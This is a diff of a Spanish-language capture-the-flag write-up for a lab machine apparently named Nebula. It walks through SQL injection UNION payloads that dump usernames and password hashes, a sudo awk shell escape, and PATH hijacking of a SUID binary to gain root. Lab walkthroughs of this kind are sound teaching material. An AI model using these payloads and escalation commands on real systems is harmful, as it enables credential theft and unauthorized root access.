@@ -1,8 +1,8 @@
-I"R)<h2 id="enumeracion">Enumeracion</h2>
+I"o;<h2 id="enumeracion">Enumeracion</h2>
 
 <p>Iniciamos con un escaneo de nmap donde encontraremos el puerto 22 y 80</p>
 
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="no">T4</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.86</span> 
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="no">T4</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.81</span>
 </code></pre></div></div>
 
 <ul>
@@ -74,7 +74,7 @@
 
 <p><img src="/assets/img/nebula/6.png" alt="" /></p>
 
-<h3 id="enumerar-bases-de-datos">Enumerar bases de datos</h3>
+<h4 id="enumerar-bases-de-datos">Enumerar bases de datos</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>information_schema: es una base de datos que contiene informacion de otras bases de datos
 </code></pre></div></div>
@@ -88,21 +88,21 @@
 
 <p><img src="/assets/img/nebula/7.png" alt="" /></p>
 
-<h3 id="enumerar-tablas">Enumerar tablas</h3>
+<h4 id="enumerar-tablas">Enumerar tablas</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>table_name: Contiene informacion de las tablas de la base de datos que se indique en table_schema (nombre de la DB)
 </code></pre></div></div>
 
-<p>Para enumerar tablas usaremos el siguiente payload que selecionara las tablas de  <strong>table_name</strong> de la base de datos que se indique en <strong>table_schema</strong></p>
+<p>Para enumerar tablas usaremos el siguiente payload que selecionara la columna  <strong>table_name</strong> de la base de datos que se indique en <strong>table_schema</strong></p>
 
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">search_central</span><span class="p">.</span><span class="nf">php?</span><span class="nb">id</span><span class="o">=</span><span class="mi">1</span><span class="err">'</span>  <span class="no">UNION</span> <span class="no">SELECT</span> <span class="n">table_name</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span> <span class="no">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="nf">tables</span> <span class="no">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"nebuladb"</span><span class="o">--</span> <span class="o">-</span>
 </code></pre></div></div>
 
 <p>Podemos ver las tablas</p>
 
-<p><img src="/assets/img/nebula/7.png" alt="" /></p>
+<p><img src="/assets/img/nebula/tablas.png" alt="" /></p>
 
-<h3 id="enumerar-columnas">Enumerar columnas</h3>
+<h4 id="enumerar-columnas">Enumerar columnas</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>column_name: Contiene informacion de las columnas de la tabla que se indique en "table_name" de la base de datos "table_schema"
 </code></pre></div></div>
@@ -118,4 +118,57 @@
 
 <h4 id="dumpear-datos">Dumpear datos</h4>
 
+<p>Para seleccionar los datos de las tablas, es comun usar <strong>CONCAT</strong> para no sobrepasar el numero de columnas de la tabla que esta siendo usada. Pero en este caso podemos hacerlo directamente</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="no">UNION</span> <span class="no">SELECT</span> <span class="no">CONCAT</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span> <span class="no">FROM</span> <span class="n">nebuladb</span><span class="p">.</span><span class="nf">users</span><span class="o">--</span> <span class="o">-</span>        <span class="no">CONCAT</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="no">UNION</span> <span class="no">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="mi">3</span> <span class="no">FROM</span> <span class="n">nebuladb</span><span class="p">.</span><span class="nf">users</span><span class="o">--</span> <span class="o">-</span>            <span class="no">NORMAL</span>
+</code></pre></div></div>
+
+<p>Podemos ver los usuarios y sus hashes:</p>
+
+<p><img src="/assets/img/nebula/10.png" alt="" /></p>
+
+<p>Despues de probar los usuarios y contraseñas, podemos acceder via ssh como el usuario <strong>pmccentral</strong> y su contraseña (esta hasheada y es md5)</p>
+
+<h2 id="pmccentral----laboratoryadmin-awk-abuse">pmccentral  -&gt; laboratoryadmin (awk abuse)</h2>
+
+<p>Mirando los permisos a nivel de sudoers nos podemos dar cuenta que podemos ejecutar <strong>awk</strong> como <strong>laboratoryadmin</strong>, haciendo una busqueda rapida de GTFOBins, encontramos una forma de conseguir una shell ingresando el siguiente comando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> laboratoryadmin /usr/bin/awk <span class="s1">'BEGIN {system("/bin/bash")}'</span>
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios-path-hijacking">Escalada de privilegios (PATH hijacking)</h2>
+
+<p>Si miramos los permisos SUID, encontraremos el  archivo <strong>PMCEmployees</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/home/</span><span class="n">laboratoryadmin</span><span class="o">/</span><span class="n">autoScripts</span><span class="o">/</span><span class="no">PMCEmployees</span>
+</code></pre></div></div>
+
+<p>Si entramos el directorio <strong>autoScripts</strong> encontraremos un archivo llamado <strong>head</strong> que ejecuta <strong>bash -p</strong></p>
+
+<p>Si usamos el comando file veremos que <strong>PMCEmployees</strong> es un binario de 64 bits</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PMCEmployees</span><span class="p">:</span> <span class="n">setuid</span> <span class="no">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span>
+</code></pre></div></div>
+
+<p>Usando <strong>strings ./PMCEmployees</strong> encontramos que se este ejecutando el comando <strong>head</strong> desde una ruta relativa:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">head</span> <span class="sr">/home/</span><span class="n">pmccentral</span><span class="o">/</span><span class="n">documents</span><span class="o">/</span><span class="n">employees</span><span class="p">.</span><span class="nf">txt</span>
+</code></pre></div></div>
+<p>Lo cual es un gran indicio de <strong>PATH hijacking</strong></p>
+
+<ol>
+  <li>Primero crearemos el archivo <strong>employees.txt</strong></li>
+  <li>Despues exportaremos la ruta acual al PATH: <strong>export PATH=/home/laboratoryadmin/autoScripts:$PATH</strong></li>
+  <li>Y por ultimo ejecutamos el binario de nuevo y seremos root</li>
+</ol>
+
+<p><img src="/assets/img/nebula/11.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
 :ET
